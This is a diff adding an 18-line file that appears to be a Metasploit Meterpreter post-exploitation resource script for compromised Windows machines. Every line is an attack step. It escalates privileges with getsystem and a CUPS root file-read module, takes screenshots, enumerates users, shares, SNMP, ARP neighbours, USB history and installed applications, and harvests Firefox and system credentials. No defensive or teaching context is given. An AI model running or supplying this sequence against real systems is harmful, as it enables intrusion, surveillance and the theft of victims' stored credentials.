@@ -1,0 +1,18 @@
+getsystem
+sysinfo
+screenshot -v -p gather.jpeg -v true
+run post/multi/gather/env
+enumdesktops
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_shares
+show_mount
+run post/multi/escalate/cups_root_file_read
+run post/windows/gather/dumplinks
+run post/windows/gather/enum_snmp
+run post/windows/gather/arp_scanner
+netstat
+arp
+run post/windows/gather/usb_history
+run post/multi/gather/firefox_creds
+run post/windows/gather/credential_collector
+run post/windows/gather/enum_applications
